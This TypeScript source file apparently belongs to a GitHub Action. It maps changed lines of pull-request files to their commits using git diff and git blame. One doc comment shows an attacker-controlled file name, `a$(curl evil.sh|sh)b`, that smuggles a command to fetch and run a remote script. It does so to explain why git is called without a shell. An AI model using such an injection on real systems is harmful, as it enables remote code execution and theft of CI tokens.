import * as exec from "@actions/exec";
import * as core from "@actions/core";

interface BlameOptions {
  baseRef: string;
  headRef: string;
  lookbackDays?: number;
}

interface BlameLine {
  commit: string;
  author: string;
  authorEmail: string;
  lineNumber: number;
}

export async function analyzeFileBlame(
  file: { filename: string; status: string },
  options: BlameOptions,
): Promise<Map<string, number>> {
  const { baseRef, headRef, lookbackDays } = options;

  // Check if file exists at base ref (skip new files)
  const fileExistsAtBase = await checkFileExists(file.filename, baseRef);
  if (!fileExistsAtBase) {
    core.debug(`Skipping new file: ${file.filename}`);
    return new Map();
  }

  // Get the diff to find changed lines
  const changedLines = await getChangedLines(file.filename, baseRef, headRef);
  if (changedLines.length === 0) {
    return new Map();
  }

  // Run git blame
  const blameData = await getBlameData(file.filename, baseRef, lookbackDays);

  // Count lines per commit for changed lines
  const commitCounts = new Map<string, number>();

  for (const lineNum of changedLines) {
    const blame = blameData.get(lineNum);
    if (!blame) continue;

    const currentCount = commitCounts.get(blame.commit) || 0;
    commitCounts.set(blame.commit, currentCount + 1);
  }

  return commitCounts;
}

async function checkFileExists(
  filename: string,
  ref: string,
): Promise<boolean> {
  try {
    await execGit(["cat-file", "-e", `${ref}:${filename}`]);
    return true;
  } catch {
    return false;
  }
}

async function getChangedLines(
  filename: string,
  baseRef: string,
  headRef: string,
): Promise<number[]> {
  const diffOutput = await execGit([
    "diff",
    `${baseRef}..${headRef}`,
    "--",
    filename,
  ]);

  const lines = diffOutput.split("\n");
  const changedLines: number[] = [];
  let currentLine = 0;

  for (const line of lines) {
    // Parse diff headers like @@ -10,7 +10,7 @@
    const hunkMatch = line.match(/^@@ -(\d+),?\d* \+(\d+),?\d* @@/);
    if (hunkMatch) {
      currentLine = parseInt(hunkMatch[1], 10);
      continue;
    }

    if (line.startsWith("-")) {
      // Line was removed or modified
      changedLines.push(currentLine);
    } else if (!line.startsWith("+")) {
      // Context line
      currentLine++;
    }
  }

  return changedLines;
}

async function getBlameData(
  filename: string,
  ref: string,
  lookbackDays?: number,
): Promise<Map<number, BlameLine>> {
  const blameArgs = ["blame", "--line-porcelain"];

  // Add date filter if specified
  if (lookbackDays && lookbackDays > 0) {
    const since = new Date();
    since.setDate(since.getDate() - lookbackDays);
    blameArgs.push(`--since=${since.toISOString()}`);
  }

  // Options have to come before the pathspec, everything after `--` is a path.
  blameArgs.push(ref, "--", filename);

  const blameOutput = await execGit(blameArgs);
  return parseBlameOutput(blameOutput);
}

function parseBlameOutput(blameOutput: string): Map<number, BlameLine> {
  const lines = blameOutput.split("\n");
  const blameData = new Map<number, BlameLine>();

  let currentCommit: string | null = null;
  let currentLineNum: number | null = null;
  let currentAuthor: string | null = null;
  let currentEmail: string | null = null;

  for (const line of lines) {
    // Parse commit hash line
    const commitMatch = line.match(/^([0-9a-f]{40}) (\d+) (\d+)/);
    if (commitMatch) {
      currentCommit = commitMatch[1];
      currentLineNum = parseInt(commitMatch[2], 10);
      continue;
    }

    // Parse author
    if (line.startsWith("author ")) {
      currentAuthor = line.substring(7);
      continue;
    }

    // Parse author email
    if (line.startsWith("author-mail ")) {
      currentEmail = line.substring(12).replace(/[<>]/g, "");

      // We have all the info for this line
      if (currentCommit && currentLineNum && currentAuthor) {
        blameData.set(currentLineNum, {
          commit: currentCommit,
          author: currentAuthor,
          authorEmail: currentEmail || "",
          lineNumber: currentLineNum,
        });
      }
    }
  }

  return blameData;
}

/**
 * Run git with an explicit argument list.
 *
 * Arguments are handed to the process directly and never go through a shell.
 * Some of them, filenames in particular, come from the pull request and are
 * therefore attacker controlled: a file named `a$(curl evil.sh|sh)b` would run
 * as a command if these were interpolated into a shell string. That matters
 * most under `pull_request_target`, where the job holds a writable token.
 */
async function execGit(args: string[]): Promise<string> {
  let output = "";
  let error = "";

  const options: exec.ExecOptions = {
    listeners: {
      stdout: (data: Buffer) => {
        output += data.toString();
      },
      stderr: (data: Buffer) => {
        error += data.toString();
      },
    },
    silent: true,
    ignoreReturnCode: true,
  };

  const exitCode = await exec.exec("git", args, options);

  if (exitCode !== 0) {
    const errorMessage = error || `Command failed with exit code ${exitCode}`;
    throw new Error(
      `Failed to execute command: git ${args.join(" ")}\nError: ${errorMessage}`,
    );
  }

  if (error) {
    core.debug(`Command stderr: ${error}`);
  }

  return output;
}
